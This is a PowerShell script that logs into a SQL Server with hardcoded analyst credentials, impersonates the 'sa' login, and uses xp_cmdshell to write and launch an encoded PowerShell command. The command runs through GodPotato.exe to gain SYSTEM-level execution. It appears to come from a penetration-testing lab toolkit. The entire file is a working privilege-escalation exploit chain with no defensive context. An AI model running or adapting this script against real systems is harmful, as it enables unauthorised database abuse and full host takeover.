[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$Server = "192.168.77.22",
    [Parameter(Mandatory=$false)]
    [string]$Username = "analyst_t1",
    [Parameter(Mandatory=$false)]
    [string]$Password = "T13r_An@lyst!",
    [Parameter(Mandatory=$false)]
    [string]$GpPath = "C:\Windows\Temp\cadre-tools\GodPotato.exe",
    [Parameter(Mandatory=$true)]
    [string]$ScriptBlock
)
$ErrorActionPreference = "Stop"

$bytes = [System.Text.Encoding]::Unicode.GetBytes($ScriptBlock)
$encoded = [Convert]::ToBase64String($bytes)
$cmd = "powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded"
$cmdPath = "C:\Windows\Temp\cadre-tools\cadre-gp.cmd"

$connStr = "Server=$Server;Database=master;Integrated Security=false;User ID=$Username;Password=$Password;TrustServerCertificate=True;"
try {
    Add-Type -AssemblyName System.Data
    $conn = New-Object System.Data.SqlClient.SqlConnection($connStr)
    $conn.Open()

    function Invoke-SqlCmd($sql) {
        $c = $conn.CreateCommand()
        $c.CommandText = "EXECUTE AS LOGIN = 'sa'; $sql; REVERT"
        $c.CommandTimeout = 180
        $c.ExecuteNonQuery() | Out-Null
    }

    function Invoke-SqlReader($sql) {
        $c = $conn.CreateCommand()
        $c.CommandText = "EXECUTE AS LOGIN = 'sa'; $sql; REVERT"
        $c.CommandTimeout = 180
        $reader = $c.ExecuteReader()
        $out = @()
        while ($reader.Read()) {
            if ($reader.IsDBNull(0)) { continue }
            $out += $reader.GetString(0)
        }
        $reader.Close()
        return $out
    }

    Invoke-SqlCmd "EXEC master..xp_cmdshell 'echo $cmd > $cmdPath'"
    $out = Invoke-SqlReader "EXEC master..xp_cmdshell '$GpPath -cmd $cmdPath'"
    $out | ForEach-Object { Write-Output $_ }
    $conn.Close()
} catch {
    Write-Output "SYSTEM_EXEC_FAIL: $($_.Exception.Message)"
    exit 1
}
